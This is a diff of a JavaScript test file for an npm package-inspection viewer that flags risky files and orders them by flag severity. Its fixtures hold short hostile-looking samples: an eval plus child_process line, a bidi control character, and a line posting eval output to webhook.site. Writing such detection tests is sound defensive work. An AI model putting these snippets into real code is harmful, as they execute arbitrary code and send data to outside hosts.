@@ -1,6 +1,7 @@
 import assert from 'node:assert/strict'
 import { beforeEach, mock, test } from 'node:test'
 import './_polyfills.js'
+import { holdVersion, riskAnswer } from './_npm-risk.js'
 
 // The real Overview's Files list, its server answers none.
 mock.module('../ui/view/render.js', { namedExports: { render() {} } })
@@ -14,7 +15,7 @@ mock.module('../ui/view/dialogs/why-dialog.js', { exports: { openWhyDialog() {} 
 // Socket's alerts on the version's files, by `name@version`.
 const socket = {}
 const managed = ['getPreviewRole', 'clearPreviewRole', 'resetManagedAppState', 'setManagedAppSession', 'setManagedReportCatalog', 'readReportSources', 'clearReportSources',
-  'fetchReportSources', 'loadManagedBundle', 'probeSession', 'probeTeams', 'fetchManagedBundleCatalog', 'fetchNpmPackage', 'fetchNpmDownloadCounts', 'fetchPrettyBundleFile',
+  'fetchReportSources', 'loadManagedBundle', 'probeSession', 'probeTeams', 'fetchManagedBundleCatalog', 'fetchNpmPackage', 'fetchPrettyBundleFile',
   'fetchPrettyNpmFile', 'fetchBundleRenameDiff', 'fetchNpmRenameDiff', 'openManagedShareDialog', 'openManagedIssueDialog', 'openFindingHistoryDialog', 'fetchReport', 'fetchReports',
   'fetchTeamAnnotations', 'fetchReportTriage', 'fetchFixes', 'fetchReportComments', 'saveReportComment', 'deleteReportComment', 'pushReportTriage', 'login', 'logout', 'stopViewing',
   'fetchBundleMetadata', 'fetchBundleContents', 'fetchTeamReports', 'watchTeamFeed', 'fetchBundleAdvisories']
@@ -23,12 +24,17 @@ mock.module('../ui/view/client-managed.js', { exports: {
   fetchNpmAdvisories: () => Promise.resolve({ versions: [], advisories: [] }), fetchNpmStats: () => Promise.resolve({}),
   fetchNpmProvenance: () => Promise.resolve({ provenance: null }), fetchNpmSocket: (name, version) => Promise.resolve({ socket: socket[`${name}@${version}`] ?? null }),
   fetchNpmTags: () => Promise.resolve({ tags: [] }), fetchNpmVersions: () => Promise.resolve({ versions: [] }),
+  fetchNpmRisk: (name, version, otherVersion) => Promise.resolve(riskAnswer(name, version, otherVersion)),
 } })
 const { byFlags } = await import('../ui/view/file-flags.js')
 const { state } = await import('../client/state.ts')
 const { renderBundlesList } = await import('../ui/view/render-bundle.js')
 const { npmPackageDetails, npmPackageEntry } = await import('../ui/view/npm-package.js')
 const { npmFileFlags } = await import('../ui/view/npm-overview.js')
+const { npmRisk } = await import('../ui/view/npm-risk.js')
+// A version's details, held for the server's risk (_npm-risk.js), once its
+// risk has arrived.
+const told = async details => { holdVersion(details, npmRisk).risk(); await new Promise(resolve => { setImmediate(resolve) }); return details }
 const { fileMetaFlags } = await import('../ui/view/bundle-compare-meta.js')
 
 const renderText = value => Array.isArray(value) ? value.map(renderText).join('')
@@ -63,12 +69,12 @@ test('Flags order: the most severe flag first, then the most flags, then their n
   ])
 })
 
-test('a file\'s flags are what its tags show, alerts by their severity, warnings high and notices', () => {
+test('a file\'s flags are what its tags show, alerts by their severity, warnings high and notices', async () => {
   const entry = npmPackageEntry({ name: 'pkg', version: '1.0.0', integrity: 'sha512-flags', manifest: {} })
-  const details = npmPackageDetails(entry, { files: [
+  const details = await told(npmPackageDetails(entry, { files: [
     ['index.js', 40, 'module.exports = 1\n'], ['run.js', 40, 'eval(code)\nrequire("child_process")\n'], ['README.md', 10, '# pkg\n'],
     ['dist/a.min.js', 3000, `${'a;'.repeat(1500)}\n`], ['ctl.js', 10, 'x = "‮"\n'], ['logo.png', 4, null], ['send.js', 40, 'post("https://webhook.site/x", eval(code))\n'],
-  ] })
+  ] }))
   assert.deepEqual(npmFileFlags(details, 'index.js'), [], 'none for what reads as most files do')
   assert.deepEqual(npmFileFlags(details, 'run.js'), [{ name: 'eval', severity: 'high' }, { name: 'child_process', severity: 'high' }])
   assert.deepEqual(npmFileFlags(details, 'ctl.js').map(({ name, severity }) => `${name}:${severity}`), ['Controls:high'])
@@ -91,7 +97,7 @@ test('the npm Overview\'s Files offer Flags where a file listed is flagged, orde
     const list = [...markup.match(/<ul class="bundles-sources-list">(.*?)<\/ul>/su)[1].matchAll(/class="bundles-source-path"[^>]*>(.*?)<\/span>/gu)].map(match => match[1])
     return { header, list }
   }
-  const details = npmPackageDetails(entry, { files })
+  const details = await told(npmPackageDetails(entry, { files }))
   const flagged = render(details, 'flags')
   assert.match(flagged.header, /aria-pressed=false[^>]*>Name<[^]*aria-pressed=false[^>]*>Size<[^]*aria-pressed=true[^>]*>Flags</u)
   assert.deepEqual(flagged.list, ['z.js', 'logo.png', 'run.js', 'a.js', 'b.js'], 'two warnings, then Binary before eval, then the rest by path')
@@ -99,13 +105,13 @@ test('the npm Overview\'s Files offer Flags where a file listed is flagged, orde
   // Socket's alerts on a file, once its report arrives, as its tags show them.
   const alerted = npmPackageEntry({ name: 'alerted', version: '1.0.0', integrity: 'sha512-alerted-files', manifest: {} })
   socket['alerted@1.0.0'] = { scores: null, alerts: [{ type: 'malware', severity: 'critical', file: 'b.js' }] }
-  const alertedDetails = npmPackageDetails(alerted, { files })
+  const alertedDetails = await told(npmPackageDetails(alerted, { files }))
   render(alertedDetails, 'flags', alerted)
   await new Promise(resolve => { setImmediate(resolve) })
   assert.deepEqual(render(alertedDetails, 'flags', alerted).list, ['b.js', 'z.js', 'logo.png', 'run.js', 'a.js'], 'a critical alert first')
   // None flagged: no Flags, and Name's order where it was chosen.
   const plain = npmPackageEntry({ name: 'plain', version: '1.0.0', integrity: 'sha512-plain-files', manifest: {} })
-  const quiet = render(npmPackageDetails(plain, { files: [['b.js', 4, 'b\n'], ['a.js', 4, 'a\n']] }), 'flags', plain)
+  const quiet = render(await told(npmPackageDetails(plain, { files: [['b.js', 4, 'b\n'], ['a.js', 4, 'a\n']] })), 'flags', plain)
   assert.doesNotMatch(quiet.header, />Flags</u)
   assert.match(quiet.header, /aria-pressed=true[^>]*>Name</u)
   assert.deepEqual(quiet.list, ['a.js', 'b.js'])
